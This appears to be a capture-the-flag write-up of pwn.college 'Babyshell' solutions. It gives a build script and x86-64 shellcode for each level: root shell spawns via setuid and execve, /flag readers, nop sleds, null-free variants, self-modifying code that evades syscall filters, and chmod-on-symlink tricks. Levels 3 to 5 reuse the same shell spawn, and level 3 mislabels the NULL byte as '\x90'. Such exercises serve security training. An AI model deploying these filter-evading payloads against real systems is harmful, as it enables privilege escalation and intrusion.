# Pwn college Babyshell

```py
  1 #!/bin/bash                                                                             
  2 # script for generating solution
  3 # defining I/O files
  4 file="a.s"
  5 sol="sol.txt"
  6 out="a.out"
  7     
  8 # colored terminal
  9 RED="\033[0;31m"
 10 NC="\033[0m" 
 11 GREEN="\033[0;32m"
 12 YELLOW="\033[1;33m"
 13     
 14 echo -e "compiling assembly from ${RED}${file}${NC}"
 15 gcc -z execstack -fno-stack-protector -nostdlib -static -o $out $file
 16 echo -e "copying text section binary to ${RED}${sol}"
 17 objcopy --dump-section .text=$sol $out
 18  
 19 echo -e "${GREEN}#### DONE! ####"
```


# 1
```s
  1 .intel_syntax noprefix    
  2 .global _start
  3 .section .text
  4 _start:
  5     mov rax,105
  6     xor rdi,rdi
  7     syscall
  8  
  9     mov rax,59
 10     lea rdi, [rip+binsh]
 11     xor rsi,rsi
 12     xor rdx,rdx
 13     syscall
 14  
 15 binsh:
 16     .string "/bin/sh"
 17  
```
    cat sol.txt - | /challenge/...

```s
.global _start
_start:
.intel_syntax noprefix
    # Open file descriptor
    mov rsi, 0                  # flags
    lea rdi, [rip+flag]         # path name
    mov rax, 2                  # syscall number (sys_open)
    syscall                     # syscall (call into kernel)

    # Read
    mov rdi, 1                  # out_fd
    mov rsi, rax                # in_fd
    mov rdx, 0                  # offset
    mov r10, 100                # count
    mov rax, 40                 # syscall (sys_sendfile)
    syscall                     # call into the kernel
    
    # Exit
    mov rax, 60                 # syscall (sys_exit)
    mov rdi, 42                 # exit number
    syscall                     # syscall
flag:
    .ascii "/flag\0"
```

## 2
```s
.intel_syntax noprefix
.global _start
.section .text
_start:
    mov rsi,0
    lea rdi, [rip+flag]
    mov rax, 2
    syscall

    mov rdi,1      # stdout
    mov rsi,rax    # /flag fd
    xor rdx,rdx    # offset
    mov r10,100    # count
    mov rax,40
    syscall
flag:
    .string "/flag"
```

```py
shellcode = ""
with open("sol.txt", "rb") as f:
    shellcode = f.read()
    f.close()

with open("sol.txt","wb") as f:
    data = b"\x90"*800
    data += shellcode
    f.write(data)
    f.close()
```
Task: This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly execute and then your real shellcode will run. This concept is called a `nop sled`.

## 3
Task: This challenge requires that your shellcode have no NULL (`\x90`) bytes!

Use [Online disassembler](https://defuse.ca/online-x86-assembler.htm) to check the opcode.

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

    xor rax,rax
    or  rax,0x69
    xor rdi,rdi
    syscall

    xor     rdx, rdx
    mov     rbx, 0x68732f6e69622f2f # '//bin/sh'
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    mov     al, 0x3b # syscall execve
    syscall
```

## 4
Task: This challenge requires that your shellcode have no H (`\x48`) bytes!

Use [Online disassembler](https://defuse.ca/online-x86-assembler.htm) to check the opcode.

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

# open flag fd
xor eax, eax
mov eax, 2
push [rip+flag]
push rsp
pop rdi
xor esi, esi
syscall

# sendfile
xor edi, edi
mov edi, 1
xor esi, esi
mov esi, eax
xor eax, eax
mov eax, 0x28
xor edx, edx
xor r10d, r10d
mov r10d, 0x37
syscall

xor eax, eax
mov eax, 60
xor edi, edi
syscall

flag:
    .string "/flag"
```

## 5
Task: This challenge requires that your shellcode does not have any `syscall`, `sysenter`, or `int` instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: `0x0f05`
(`syscall`), `0x0f34` (`sysenter`), and `0x80cd` (`int`). One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

xor rax,rax
or  rax,0x69
xor rdi,rdi

# creating syscall at runtime
inc byte ptr [rip+sys_1]
inc byte ptr [rip+sys_1+1]
sys_1:
.byte 0x0e
.byte 0x04

xor     rdx, rdx
mov     rbx, 0x68732f6e69622f2f # '//bin/sh'
shr     rbx, 0x8
push    rbx
mov     rdi, rsp
push    rax
push    rdi
mov     rsi, rsp
mov     al, 0x3b # syscall execve

# creating syscall at runtime
inc byte ptr [rip+sys_2]
inc byte ptr [rip+sys_2+1]
sys_2:
.byte 0x0e
.byte 0x04
```

## 6
This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

Removing write permissions from first 4096 bytes of shellcode.

```py
shellcode = ""
with open("sol.txt", "rb") as f:
    shellcode = f.read()
    f.close()

with open("sol.txt","wb") as f:
    data = b"\x90"*4096
    data += shellcode
    f.write(data)
    f.close()
```

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

xor rax,rax
or  rax,0x69
xor rdi,rdi
inc byte ptr [rip+sys_1]
inc byte ptr [rip+sys_1+1]
sys_1:
.byte 0x0e
.byte 0x04

xor     rdx, rdx
mov     rbx, 0x68732f6e69622f2f # '//bin/sh'
shr     rbx, 0x8
push    rbx
mov     rdi, rsp
push    rax
push    rdi
mov     rsi, rsp
mov     al, 0x3b # syscall execve

inc byte ptr [rip+sys_2]
inc byte ptr [rip+sys_2+1]
sys_2:
.byte 0x0e
.byte 0x04
```

## 7
```s
.intel_syntax noprefix
.global _start
.section .text
_start:

push [rip+flag]
mov rdi,rsp
xor rsi,rsi
call open

mov rdi,rax # /flag fd

sub rsp, 64
mov rbp, rsp

mov rsi,rbp
mov rdx,64
call read

push [rip+myflag]
mov rdi,rsp
mov rsi,1
call open

mov rdi,rax
mov rsi,rbp
mov rdx,64
call write

jmp exit

open:
# open(path, NULL);
push rbp
mov rbp, rsp
mov rax, 2
syscall
pop rbp
ret

read:
# read(fd, buf, count)
push rbp
mov rbp, rsp
mov rax, 0
syscall
pop rbp
ret

write:
push rbp
mov rbp, rsp
mov rax, 1
syscall
pop rbp
ret

exit:
mov rax, 60
xor rdi, rdi
syscall

myflag:
	.string "myflag"

flag:
	.string "/flag"
```
Task:
This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need
to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.

This challenge is about to close stderr, which means that you will not be able to get use file descriptor 2 for output.

This challenge is about to close stdout, which means that you will not be able to get use file descriptor 1 for output.
You will see no further output, and will need to figure out an alternate way of communicating data back to yourself.

## 8
Task: Reading 0x12 bytes from stdin. 

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

push 0x41
push rsp
pop rdi
mov esi,444
mov rax,90
syscall

```
```sh
ls -s /flag A
```

## 9
Task:
This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an
instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your
shellcode.

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

push 0x41
push rsp
pop rdi
jmp JUMP

nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

JUMP:
mov al,0x5a
mov esi,0x1f
syscall
```

## 10
Task:
This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort
(e.g., the LSB being the right-most byte).

This sort processed your shellcode 8 bytes at a time.

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

push 0x41
push rsp
pop rdi
mov al,0x5a
mov esi,0x1f
syscall
```
## 11
Task:
This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need
to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

push 0x41
push rsp
pop rdi
mov al,0x5a
mov esi,0x1f
syscall
```
## 12
Task: This challenge requires that every byte in your shellcode is unique!

```s
.intel_syntax noprefix
.global _start
.section .text
_start:

push 0x41
push rsp
pop rdi
mov al,0x5a
mov sil,0x4
syscall
```

## 13
Task: Reading 0xc bytes from stdin.
```s
.intel_syntax noprefix
.global _start
.section .text
_start:

push 0x41
push rsp
pop rdi
mov al,0x5a
mov sil,0x4
syscall
```
## 14
Task: Reading 0x6 bytes from stdin.
```s
.intel_syntax noprefix
.global _start
.section .text
_start:

push rax
pop rdi
push rdx
pop rsi
syscall

nop
nop
nop
nop
nop

nop
nop
nop
nop
nop

push 0x42
push rsp
pop rdi
mov al,0x5a
mov sil,0x4
syscall
```
```sh
ln -sf /flag A
cat A
```